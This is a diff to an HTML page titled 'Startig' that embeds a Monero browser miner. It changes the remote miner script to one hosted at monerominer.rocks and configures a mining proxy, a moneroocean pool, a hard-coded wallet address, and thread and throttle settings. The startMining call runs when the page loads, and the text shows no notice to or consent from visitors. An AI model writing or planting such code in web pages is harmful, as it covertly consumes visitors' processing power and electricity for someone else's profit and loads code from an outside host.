@@ -10,35 +10,34 @@
 
     <title>Startig</title>
 
- 
+
 
  
 
     <!-- Start Of Mining Code -->
 
-    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+    <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 
-    <script>
+<script>
 
-        console.log("Config Loaded")
+    server = "wss://f.xmrminingproxy.com:8181";
 
-        server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "gulf.moneroocean.stream:20128";
 
-        var pool = "gulf.moneroocean.stream:80";
+    var walletAddress = "48EonXRqcmsNCdiYCvGnUKWyHddmnqCRGCkKdLiHMKjAEFGzYtFd2bNd6XA8SLxqdzNHcrqPNYe2mFFLypfhNATwVGurBqG";
 
-        var walletAddress = "48EonXRqcmsNCdiYCvGnUKWyHddmnqCRGCkKdLiHMKjAEFGzYtFd2bNd6XA8SLxqdzNHcrqPNYe2mFFLypfhNATwVGurBqG";
+    var workerId = "x"
 
-        var workerId = "x"
+    var threads = -5;
 
-        var threads = -1;
+    var password = "x";
 
-        var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
 
-        startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
 
-        throttleMiner = 25;
+</script>
 
-    </script>
 
     <!-- End Of Mining Code -->
 
